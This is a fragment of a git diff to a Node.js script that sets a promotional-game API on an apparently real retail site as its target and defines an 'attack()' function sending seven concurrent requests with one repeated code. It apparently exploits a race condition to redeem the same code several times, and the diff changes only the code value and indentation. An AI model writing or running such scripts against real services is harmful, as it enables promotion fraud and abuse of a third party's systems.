@@ -2,10 +2,10 @@ const axios = require('axios');
 
 const TARGET_URL = 'https://fahasa-game.cdp.vn/api/update';
 // Single code, multiple requests
-const CODES = Array(7).fill('ABC22'); 
-
-async function attack() {
-    console.log(`🚀 Starting SAME-CODE attack on ${TARGET_URL} with 7x ABC21`);
+const CODES = Array(7).fill('ABC21'); 
+  
+  async function attack() {
+      console.log(`🚀 Starting SAME-CODE attack on ${TARGET_URL} with 7x ABC21`);
     
     // Tạo request đồng thời
     const requests = CODES.map((code, index) => {
